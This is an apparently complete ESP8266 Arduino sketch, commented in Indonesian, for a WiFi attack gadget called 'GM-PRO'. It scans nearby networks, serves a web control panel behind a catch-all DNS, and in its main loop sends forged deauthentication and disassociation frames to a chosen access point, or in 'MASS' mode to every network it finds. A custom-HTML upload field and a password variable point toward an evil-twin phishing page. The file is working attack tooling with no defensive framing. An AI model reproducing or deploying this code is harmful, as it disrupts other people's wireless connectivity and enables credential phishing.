#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h>
#include "SSD1306Wire.h"

extern "C" {
#include "user_interface.h"
int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
}

// Inisialisasi OLED 64x48 (D2=SDA, D1=SCL)
SSD1306Wire display(0x3c, 4, 5, GEOMETRY_64_48);

// Definisi Struktur Network
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
} _Network;

// --- DEKLARASI VARIABEL GLOBAL (FIX ERROR 'NOT DECLARED') ---
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
String _logs = "";
String _customHTML = "";
String _tryPassword = "";
uint32_t _deauthCount = 0;
bool deauthing_active = false;
bool mass_deauth = false;
bool hotspot_active = false;

unsigned long now = 0;
unsigned long deauth_now = 0;
#define LED_PIN 2

// Fungsi Konversi BSSID
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

// Fungsi Update OLED
void updateOLED(String status) {
  display.clear();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(0, 0, "GM-PRO V3");
  display.drawString(0, 11, "Pkt: " + String(_deauthCount));
  display.drawString(0, 22, "ST: " + status);
  if(deauthing_active || mass_deauth) display.drawString(0, 33, "ATTACKING");
  display.display();
}

// Fungsi Log
void addLog(String msg) {
  _logs = "[" + String(millis()/1000) + "s] " + msg + "\n" + _logs;
  if(_logs.length() > 1000) _logs = _logs.substring(0, 1000); 
}

void performScan() {
  int n = WiFi.scanNetworks();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      _networks[i].rssi = WiFi.RSSI(i);
      for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
    }
  }
}

void handleUpload() {
  if (webServer.hasArg("html_content")) {
    _customHTML = webServer.arg("html_content");
    addLog("HTML Updated");
    webServer.send(200, "text/plain", "OK: HTML Tersimpan");
  } else {
    webServer.send(400, "text/plain", "Err: Data Kosong");
  }
}

void handleIndex() {
  if (webServer.hasArg("clear_logs")) { _logs = ""; }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  if (webServer.hasArg("mass")) mass_deauth = (webServer.arg("mass") == "start");
  
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        addLog("Selected: " + _selectedNetwork.ssid);
        updateOLED("SEL: " + _selectedNetwork.ssid.substring(0,5));
      }
    }
  }

  String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>";
  html += "body{background:#000;color:#0f0;font-family:monospace;padding:10px;}";
  html += ".btn{padding:10px;margin:5px;display:inline-block;text-decoration:none;border-radius:4px;border:1px solid #0f0;font-weight:bold;}";
  html += ".on{background:#f00;color:#fff;border:none;} .off{background:#000;color:#0f0;}";
  html += "table{width:100%;font-size:12px;} td{padding:5px;border-bottom:1px solid #222;}";
  html += "</style></head><body>";
  
  html += "<h2>GM-PRO V3.9</h2>";
  
  // Tombol Dinamis
  html += "<a class='btn " + String(deauthing_active ? "on" : "off") + "' href='/?deauth=" + (deauthing_active ? "stop" : "start") + "'>DEAUTH</a>";
  html += "<a class='btn " + String(mass_deauth ? "on" : "off") + "' href='/?mass=" + (mass_deauth ? "stop" : "start") + "'>MASS</a>";

  html += "<table><tr><th>SSID</th><th>Ch</th><th>Sig</th><th>Acc</th></tr>";
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") break;
    int sig = 2 * (_networks[i].rssi + 100);
    if(sig > 100) sig = 100;
    html += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(sig) + "%</td>";
    html += "<td><a class='btn off' style='padding:2px 5px;font-size:10px;' href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>SEL</a></td></tr>";
  }
  html += "</table>";

  html += "<h3>Logs</h3><pre style='background:#111;padding:5px;height:80px;overflow:auto;font-size:10px;'>" + _logs + "</pre>";
  html += "<a href='/?clear_logs=1' style='color:#f00;font-size:11px;'>[Hapus Log]</a>";
  
  html += "<h3>Custom HTML</h3><form action='/upload' method='POST'><textarea name='html_content' rows='3' style='width:100%;background:#222;color:#fff;'></textarea><br><input type='submit' class='btn off' value='Simpan HTML'></form>";
  
  html += "</body></html>";
  webServer.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  display.init();
  display.flipScreenVertically();
  updateOLED("READY");

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro_Nether", "sangkur87");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/upload", HTTP_POST, handleUpload);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  
  addLog("System Online");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  // LED Status
  if (deauthing_active || mass_deauth) {
    digitalWrite(LED_PIN, (millis() / 150) % 2); 
  } else {
    digitalWrite(LED_PIN, HIGH);
  }

  // Attack Loop
  if ((deauthing_active || mass_deauth) && millis() - deauth_now >= 250) {
    static int mass_idx = 0;
    if(mass_deauth) {
       _selectedNetwork = _networks[mass_idx];
       mass_idx = (mass_idx + 1) % 10;
       if(_networks[mass_idx].ssid == "") mass_idx = 0;
    }

    if(_selectedNetwork.ssid != "") {
      wifi_set_channel(_selectedNetwork.ch);
      uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
      memcpy(&pkt[10], _selectedNetwork.bssid, 6);
      memcpy(&pkt[16], _selectedNetwork.bssid, 6);
      
      if(wifi_send_pkt_freedom(pkt, 26, 0) == 0) {
        _deauthCount++;
        if(_deauthCount % 10 == 0) updateOLED("ATTACK");
      }
      
      pkt[0] = 0xA0; // Disassociate
      wifi_send_pkt_freedom(pkt, 26, 0);
    }
    deauth_now = millis();
  }

  // Auto Scan
  if (millis() - now >= 5000 && !deauthing_active && !mass_deauth) {
    performScan();
    now = millis();
    updateOLED("IDLE");
  }
}
